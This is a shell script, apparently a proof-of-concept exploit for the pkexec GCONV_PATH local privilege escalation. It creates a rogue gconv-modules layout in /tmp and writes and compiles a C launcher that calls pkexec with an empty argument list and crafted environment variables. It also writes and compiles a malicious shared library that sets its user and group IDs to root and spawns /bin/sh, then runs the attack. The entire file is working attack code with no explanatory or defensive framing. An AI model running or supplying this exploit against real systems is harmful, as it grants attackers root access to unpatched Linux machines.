#!/bin/sh

echo "[+] starting exploit"
echo "[+] creating layout"

mkdir "/tmp/GCONV_PATH=."
mkdir "/tmp/getpwned"
touch "/tmp/GCONV_PATH=./getpwned"
chmod +x "/tmp/GCONV_PATH=./getpwned"

cat << EOF > /tmp/getpwned/gconv-modules
module  UTF-8//    INTERNAL    ../../../../../../../../tmp/shell    2
module  INTERNAL    UTF-8//    ../../../../../../../../tmp/shell    2
EOF

cat << EOF > /tmp/hax.c
#include <stdio.h>
#include <unistd.h>

int main(void)
{
	char * exec_argv[] = {NULL};
	char * exec_envp[] =
	{
		"getpwned",
		"PATH=GCONV_PATH=.", // write rogue env variable
		"CHARSET=UTF-16", // force usage of iconv_open
		"SHELL=yeahdoesntexist", // trigger g_printerr()
		NULL
	};
	execve("/usr/bin/pkexec", exec_argv, exec_envp);
	return 0;
}
EOF

cat << EOF > /tmp/shell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// gcc -shared -o shell.so -fPIC shell.c

void gconv(void) {}

void gconv_init(void)
{
    	putenv("PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
	setuid(0);
	setgid(0);
	seteuid(0);
	setegid(0);
	system("/bin/sh");
}
EOF

echo "[+] compiling exploit and malicious library"

gcc -o /tmp/hax /tmp/hax.c
gcc -shared -o /tmp/shell.so -fPIC /tmp/shell.c

echo "[+] getting shell if vulnerable :)"

cd /tmp && /tmp/hax
